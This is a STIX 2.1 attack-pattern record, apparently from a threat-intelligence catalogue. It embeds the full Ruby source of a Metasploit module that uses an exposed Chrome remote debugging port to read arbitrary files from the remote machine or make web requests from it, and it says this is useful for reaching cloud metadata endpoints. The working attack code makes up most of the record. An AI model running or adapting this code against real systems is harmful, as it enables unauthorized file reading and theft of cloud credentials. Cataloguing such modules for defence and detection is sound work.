{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4185a8a5-fe3f-4b41-be86-605f46bdf73e",
    "created": "2024-08-14T16:32:37.37153Z",
    "modified": "2024-08-14T16:32:37.371534Z",
    "name": "Chrome Debugger Arbitrary File Read / Arbitrary Web Request",
    "description": " This module uses the Chrome Debugger's API to read files off the remote file system, or to make web requests from a remote machine.  Useful for cloud metadata endpoints! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/chrome_debugger.rb",
            "external_id": "chrome_debugger.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'eventmachine'\nrequire 'faye/websocket'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Chrome Debugger Arbitrary File Read / Arbitrary Web Request',\n      'Description' => %q{\n        This module uses the Chrome Debugger's API to read\n        files off the remote file system, or to make web requests\n        from a remote machine.  Useful for cloud metadata endpoints!\n      },\n      'Author' => [\n        'Adam Baldwin (Evilpacket)', # Original ideas, research, proof of concept, and msf module\n        'Nicholas Starke (The King Pig Demon)' # msf module\n      ],\n      'DisclosureDate' => '2019-09-24',\n      'License' => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(9222),\n        OptString.new('FILEPATH', [false, 'File to fetch from remote machine.']),\n        OptString.new('URL', [false, 'Url to fetch from remote machine.']),\n        OptInt.new('TIMEOUT', [true, 'Time to wait for response', 10])\n      ]\n    )\n\n    deregister_options('Proxies')\n    deregister_options('VHOST')\n    deregister_options('SSL')\n  end\n\n  def run\n    if (datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?) && (datastore['URL'].nil? || datastore['URL'].empty?)\n      print_error('Must set FilePath or Url')\n      return\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => '/json'\n    })\n\n    if res.nil?\n      print_error('Bad Response')\n      return\n    end\n\n    data = JSON.parse(res.body).pop\n    EM.run do\n      file_path = datastore['FILEPATH']\n      url = datastore['URL']\n\n      if file_path\n        fetch_uri = \"file://#{file_path}\"\n      else\n        fetch_uri = url\n      end\n\n      print_status(\"Attempting Connection to #{data['webSocketDebuggerUrl']}\")\n\n      unless data.key?('webSocketDebuggerUrl')\n        fail_with(Failure::Unknown, 'Invalid JSON')\n      end\n\n      driver = Faye::WebSocket::Client.new(data['webSocketDebuggerUrl'])\n\n      driver.on :open do\n        print_status('Opened connection')\n        id = rand(1024 * 1024 * 1024)\n\n        @succeeded = false\n\n        EM::Timer.new(1) do\n          print_status(\"Attempting to load url #{fetch_uri}\")\n          driver.send({\n            'id' => id,\n            'method' => 'Page.navigate',\n            'params' => {\n              url:  fetch_uri\n            }\n          }.to_json)\n        end\n\n        EM::Timer.new(3) do\n          print_status('Sending request for data')\n          driver.send({\n            'id' => id + 1,\n            'method' => 'Runtime.evaluate',\n            'params' => {\n              'expression' => 'document.documentElement.outerHTML'\n            }\n          }.to_json)\n        end\n      end\n\n      driver.on :message do |event|\n        print_status('Received Data')\n\n        data = JSON.parse(event.data)\n\n        if data['result']['result']\n          loot_path = store_loot('chrome.debugger.resource', 'text/plain', rhost, data['result']['result']['value'], fetch_uri, 'Resource Gathered via Chrome Debugger')\n          print_good(\"Stored #{fetch_uri} at #{loot_path}\")\n          @succeeded = true\n        end\n      end\n\n      EM::Timer.new(datastore['TIMEOUT']) do\n        EventMachine.stop\n        fail_with(Failure::Unknown, 'Unknown failure occurred') unless @succeeded\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-09-24"
}